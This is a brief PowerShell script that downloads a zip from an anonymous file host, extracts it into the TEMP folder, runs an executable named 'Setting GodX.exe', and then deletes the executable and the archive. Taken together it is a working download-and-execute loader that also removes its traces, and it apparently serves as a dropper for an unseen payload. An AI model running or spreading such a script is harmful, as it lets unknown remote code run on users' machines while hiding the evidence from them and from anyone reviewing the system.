$exeName = "Setting GodX.exe"
$zipName = "Setting GodX.zip"
$tempPath = "$env:TEMP"
$url = "https://files.catbox.moe/afb9rh.zip"

$client = New-Object System.Net.WebClient
$client.DownloadFile($url, "$tempPath\$zipName")

Expand-Archive -Path "$tempPath\$zipName" -DestinationPath $tempPath -Force

$process = Start-Process "$tempPath\$exeName" -PassThru
$process.WaitForExit()

Remove-Item "$tempPath\$exeName" -Force
Remove-Item "$tempPath\$zipName" -Force